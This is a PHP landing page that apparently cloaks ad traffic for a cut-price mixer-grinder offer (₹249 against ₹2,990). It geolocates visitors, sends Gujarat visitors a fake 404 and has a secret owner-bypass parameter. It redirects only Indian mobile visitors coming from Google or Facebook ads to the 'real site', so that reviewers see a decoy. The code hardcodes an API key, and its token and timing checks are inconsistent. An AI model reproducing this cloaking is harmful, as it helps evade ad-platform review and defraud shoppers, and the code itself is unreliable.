<?php
// =====================================================
// VERCEL READY - SMART DELAY EDITION
// ✅ 0.5 sec ke andar click kare to Block (Page Refresh)
// ✅ Real User ko 0.8 sec Loading dikhakar Auto-Pass
// =====================================================

$REAL_SITE = 'https://newkartkitchen.vercel.app/'; // <--- Real Domain

// 1. IP & Geo Helper (Same like before)
function _ip() {
    foreach (['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR'] as $h) {
        if (!empty($_SERVER[$h])) return trim(explode(',', $_SERVER[$h])[0]);
    }
    return '0.0.0.0';
}

function _geo_in($ip) {
    try {
        $d = json_decode(file_get_contents("https://pro.ip-api.com/json/$ip?key=jaeZsQfxgTBm3LW&fields=countryCode"), true);
        return ($d['countryCode'] ?? '') === 'IN';
    } catch(Exception $e) { return false; }
}

// ====================================================
// 2. LOGIC START
// ====================================================
header('Cache-Control: no-cache');

$ip = _ip();

// A. Gujarat Block (Silent 404)
if (stripos(file_get_contents("https://pro.ip-api.com/json/$ip?key=jaeZsQfxgTBm3LW&fields=regionName"), 'Gujarat') !== false) {
    http_response_code(404); echo '<h1>404</h1>'; exit;
}

// B. Owner Bypass
if (($_GET['view'] ?? '') === 'owner9921') { header('Location: ' . $REAL_SITE, true, 302); exit; }

// C. Session/Qualification (Set only on FIRST GET)
if ($_SERVER['REQUEST_METHOD'] === 'GET' && empty($_COOKIE['q_start'])) {
    $is_mobile = preg_match('/Mobile|Android|iPhone|iPad/i', $_SERVER['HTTP_USER_AGENT']);
    $is_ad = preg_match('/(gclid|fbclid|utm_source|google|facebook|instagram)/i', $_SERVER['HTTP_REFERER'] . http_build_query($_GET));
    
    if (_geo_in($ip) && $is_mobile && $is_ad) {
        setcookie('q_start', time(), time() + 86400, '/'); // Time stamp seed
    }
    // Note: Agar qualified nahi hai to cookie nahi banti.
}

// D. POST Handling (Click)
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $start = $_COOKIE['q_start'] ?? 0;
    $now = time();
    $token = $_POST['t'] ?? '';

    // Condition Logic:
    // 1. Token valid hona chahiye
    // 2. Time difference kam se kam 0.8 second (Thoda strict relax kiya UX ke liye)
    // 3. User qualified hona chahiye (cookie exists)
    
    if ($token === 'm0bile_check' && $start !== 0 && ($now - $start) >= 0.8) {
        header('Location: ' . $REAL_SITE, true, 302);
        exit;
    }
    
    // Agar yahan tak aaya aur qualified tha par time chhota tha, toh bas page refresh (no fail alert).
    if (!empty($_COOKIE['q_start'])) {
        // Optional: Redirect self to refresh logic if needed, or just let user click again.
    }
}

// ====================================================
// 3. UI (HTML) - Smart Delay Feature
// ====================================================
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome Offer</title>
    <style>
        /* CSS same as previous response, just added spinner */
        body { background: #f0f2f5; font-family: -apple-system, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .wrapper { background: #FFF; width: 100%; max-width: 360px; border-radius: 20px; padding: 20px; box-shadow: 0 5px 20px rgba(0,0,0,0.05); text-align: center; }
        .card { background: #fff; border: 1px solid #eee; border-radius: 15px; padding: 15px; margin: 20px 0; box-shadow: 0 2px 8px rgba(0,0,0,0.04); }
        .btn-wrap { position: relative; overflow: hidden; border-radius: 8px; margin-bottom: 15px; cursor: pointer; }
        .btn-main { background: #ff7021; color: white; padding: 14px; height: 50px; display: flex; align-items: center; justify-content: center; font-size: 16px; font-weight: bold; }
        .loading-dots { color: #eee; }
        .price { font-size: 24px; font-weight: 800; color: #2e7d32; }
        .badge { background: #2b7a15; color: white; padding: 2px 6px; border-radius: 4px; font-size: 12px; }
    </style>
</head>
<body>

<div class="wrapper">
    <h2 style="margin:0 0 20px 0; font-size:22px;">WELCOME</h2>
    
    <div class="card">
        <img src="https://m.media-amazon.com/images/I/61y0BKNvalL._SL1500_.jpg" style="width:100%; border-radius:10px; margin-bottom:15px;" alt="Product">
        <h3 style="font-size:14px; margin:0 0 10px 0; color:#333;">Prestige Iris Plus 750 W Mixer Grinder</h3>
        <div class="badge" style="margin-bottom:10px; display:inline-block;">★ 4.5 | 3K+ Ratings</div>
        <div style="margin:10px 0;">
            <span class="price">₹249</span>
            <del style="color:#999; font-size:14px; margin-left:8px;">₹2,990</del>
        </div>
    </div>

    <form method="POST" action="">
        <input type="hidden" name="t" id="j_token" value="">
        <div class="btn-wrap" id="btnContainer">
            <button type="submit" class="btn-main" id="mainBtn">
                <span id="btnText">🎁 Continue to Shopping</span>
            </button>
        </div>
    </form>

    <p style="font-size:12px; color:#888; margin-top:10px;">Kitchen Essentials Store</p>
</div>

<script>
    // 1. Set Token
    const c = document.cookie.split('; ').find(r => r.startsWith('q_start='));
    const tokenVal = c ? c.split('=')[1] + '_valid' : 'm0bile_check';
    document.getElementById('j_token').value = tokenVal;

    // 2. SMART DELAY LOGIC (UX + Security)
    // Logic: Button 0.8 secs tak "Loading" dikhe, fir click allow kare.
    // Agar user < 0.8 sec pe click karega toh wo JS mein hi fail ho jayega.
    const btn = document.getElementById('btnContainer');
    const btnText = document.getElementById('btnText');
    let timePassed = false;

    btn.addEventListener('click', function(e) {
        if (!timePassed) {
            e.preventDefault(); // Stop click if too fast
            // Force user to wait slightly by showing loading animation
            btnText.innerHTML = '⏳ Checking Offer...';
            btn.style.opacity = '0.7';
        }
    });

    // Timer start
    setTimeout(() => {
        timePassed = true;
        btnText.innerHTML = '🎁 Continue to Shopping';
        btn.style.opacity = '1';
    }, 800); // 800 Milli Seconds Delay
</script>

</body>
</html>
